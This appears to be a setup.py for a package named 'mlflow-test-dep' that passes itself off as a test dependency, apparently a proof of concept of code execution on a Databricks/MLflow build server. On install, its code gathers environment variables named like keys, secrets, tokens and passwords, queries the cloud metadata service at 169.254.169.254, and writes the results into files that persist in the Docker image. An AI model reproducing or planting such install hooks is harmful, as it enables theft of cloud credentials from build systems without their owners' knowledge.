import os
import urllib.request
from setuptools import setup

proof = "BUILD_SERVER_EXECUTED \n"

# 1. Try to read local environment variables (looking for secrets/tokens)
try:
    sensitive_vars = {k: v for k, v in os.environ.items() if any(x in k.upper() for x in ['KEY', 'SECRET', 'TOKEN', 'AWS', 'DATABRICKS', 'PASSWORD'])}
    proof += f"ENV_VARS_FOUND: {sensitive_vars}\n"
except Exception as e:
    proof += f"ENV_READ_ERROR: {e}\n"

# 2. Try to hit the local AWS/GCP metadata service (common in build servers)
try:
    req = urllib.request.Request("http://169.254.169.254/latest/meta-data/", timeout=2)
    with urllib.request.urlopen(req) as response:
        proof += f"META_DATA_SUCCESS:\n{response.read().decode('utf-8')[:500]}\n"
except Exception as e:
    proof += f"META_DATA_BLOCKED: {e}\n"

# 3. Write the proof to a file that will persist in the Docker image layer
try:
    with open("/tmp/databricks_build_proof.txt", "w") as f:
        f.write(proof)
    # Also try writing to the model directory just in case
    with open("/model/build_proof.txt", "w") as f:
        f.write(proof)
except Exception as e:
    pass

setup(
    name="mlflow-test-dep",
    version="0.1",
    description="A test dependency"
)